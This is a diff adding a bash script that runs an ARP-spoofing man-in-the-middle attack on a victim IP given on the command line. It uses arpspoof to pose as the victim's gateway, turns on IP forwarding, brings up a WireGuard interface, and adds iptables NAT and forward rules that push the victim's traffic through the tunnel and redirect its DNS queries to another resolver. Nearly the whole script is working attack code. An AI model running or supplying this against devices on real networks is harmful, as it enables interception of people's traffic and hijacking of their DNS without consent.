@@ -1,0 +1,79 @@
+#!/usr/bin/env bash
+
+set -euo pipefail
+
+# constants
+readonly SCRIPTPATH="$(cd "$(dirname "$0")" >/dev/null 2>&1; pwd -P)"
+readonly CONF_FILE="$SCRIPTPATH/wg.conf"
+readonly WG_INTERFACE="$(basename -s.conf "$CONF_FILE")"
+
+# argument parsing
+if (( $# != 1 )); then
+    echo "Usage: $(basename "$0") IP"
+    exit 1
+fi
+readonly VICTIM_IP="$1"
+
+# check required commands
+if ! [ -x "$(command -v arpspoof)" ]; then
+    echo 'Error: arpspoof not installed' >&2
+    echo 'Install using:' >&2
+    echo '  Arch Linux: sudo pacman -S dsniff' >&2
+    echo '  Debian/Ubuntu: sudo apt install dsniff' >&2
+    exit 1
+fi
+
+# check root
+if [ "$EUID" -ne 0 ]; then
+    echo "Please run as root" >&2
+    exit 1
+fi
+
+# check cfg file
+if ! [ -f "$CONF_FILE" ]; then
+    echo "$(basename "$CONF_FILE") is missing" >&2
+    exit 1
+fi
+
+# get all required infos
+grep_ipv4() {
+    grep -Eo '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
+}
+readonly default_route="$(ip route | grep default)"
+readonly victim_gateway="$(echo "$default_route" | grep_ipv4)"
+readonly victim_interface="$(echo "$default_route" | grep -Eo 'dev [0-9a-z]+' | sed 's/dev //')"
+readonly victim_dns="$(nmcli device show "$victim_interface" | grep IP4.DNS | grep_ipv4)"
+readonly target_dns="$(grep DNS "$CONF_FILE" | grep_ipv4)"
+
+echo "ARP Attack Target:"
+echo "  Interface: $victim_interface"
+echo "  IP: $VICTIM_IP"
+echo "  Gateway Change: $victim_gateway => self"
+echo "  DNS: $victim_dns => $target_dns"
+if [[ "$victim_dns" != "$victim_gateway" ]]; then
+    echo "DNS and gateway have to be identical (double ARP attack not implemented)"
+    exit 1
+fi
+read -rp "Press any key..."
+
+# kernel configs
+sysctl -q net.ipv4.ip_forward=1
+
+# set up wg interface
+wg-quick up "$CONF_FILE"
+
+# configure forwarding
+# https://mgnik.wordpress.com/2019/03/05/raspberry-pi-as-a-vpn-gateway-using-wireguard/
+# https://www.systutorials.com/port-forwarding-using-iptables/
+# TODO: use nftables
+iptables -t nat -A POSTROUTING -o "$WG_INTERFACE" -j MASQUERADE
+iptables -A FORWARD -i "$victim_interface" -o "$WG_INTERFACE" -j ACCEPT
+iptables -A FORWARD -i "$WG_INTERFACE" -o "$victim_interface" -m state --state RELATED,ESTABLISHED -j ACCEPT
+iptables -A PREROUTING -t nat -i "$victim_interface" -p udp --dport 53 -j DNAT --to "$target_dns":53
+
+# spoof
+arpspoof -i "$victim_interface" -t "$VICTIM_IP" "$victim_gateway"
+
+# remove wg interface
+wg-quick down "$CONF_FILE"
+iptables -D PREROUTING -t nat -i "$victim_interface" -p udp --dport 53 -j DNAT --to "$target_dns":53
